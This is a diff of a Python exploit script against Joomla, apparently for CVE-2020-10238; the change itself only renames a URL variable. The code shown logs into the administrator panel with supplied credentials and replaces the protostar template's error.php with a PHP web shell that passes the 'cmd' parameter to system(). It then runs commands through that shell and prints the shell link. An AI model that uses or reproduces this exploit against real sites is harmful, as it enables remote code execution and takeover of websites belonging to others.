@@ -18,10 +18,10 @@ def extract_token(resp):
         return None
     return match.group(1)
 
-def try_admin_login(sess, url, uname, upass):
-    admin_url = url + '/administrator/index.php'
+def try_admin_login(sess, profile_url, uname, upass):
+    admin_profile_url = profile_url + '/administrator/index.php'
     print(f'{Fore.YELLOW}Getting token for admin login{Style.RESET_ALL}')
-    resp = sess.get(admin_url, verify=False)
+    resp = sess.get(admin_profile_url, verify=False)
     token = extract_token(resp)
     if not token:
         return False
@@ -32,25 +32,25 @@ def try_admin_login(sess, url, uname, upass):
         'task': 'login',
         token: '1'
     }
-    resp = sess.post(admin_url, data=data, verify=False)
+    resp = sess.post(admin_profile_url, data=data, verify=False)
     if 'task=profile.edit' not in resp.text:
         print(f'{Fore.RED}Admin Login Failure!{Style.RESET_ALL}')
         return None
     print(f'{Fore.GREEN}{Style.BRIGHT}Admin Login Successfully! Username: {uname}, Password: {upass}{Style.RESET_ALL}')
     return True
 
-def check_admin(sess, url):
-    url_check = url + '/administrator/index.php?option=com_templates'
-    resp = sess.get(url_check, verify=False)
+def check_admin(sess, profile_url):
+    profile_url_check = profile_url + '/administrator/index.php?option=com_templates'
+    resp = sess.get(profile_url_check, verify=False)
     token = extract_token(resp)
     if not token:
         print(f"{Fore.RED}{Style.BRIGHT}You are not administrator!{Style.RESET_ALL}")
         sys.exit()
     return token
 
-def rce(sess, url, cmd, token):
+def rce(sess, profile_url, cmd, token):
     filename = 'error.php'
-    shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
+    shlink = profile_url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
     shdata_up = {
         'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
         'task': 'template.apply',
@@ -61,9 +61,9 @@ def rce(sess, url, cmd, token):
     sess.post(shlink, data=shdata_up)
     path2shell = '/templates/protostar/error.php?cmd=' + cmd
     print(f'{Fore.GREEN}Checking shell:{Style.RESET_ALL}')
-    shreq = sess.get(url + path2shell)
+    shreq = sess.get(profile_url + path2shell)
     shresp = shreq.text
-    print(shresp + f'{Fore.GREEN}Shell link: \n' + (url + path2shell) + f'{Style.RESET_ALL}')
+    print(shresp + f'{Fore.GREEN}Shell link: \n' + (profile_url + path2shell) + f'{Style.RESET_ALL}')
     print(f'{Fore.GREEN}{Style.BRIGHT}Module finished.{Style.RESET_ALL}')
 
 def scan_cve_2020_10238(target):
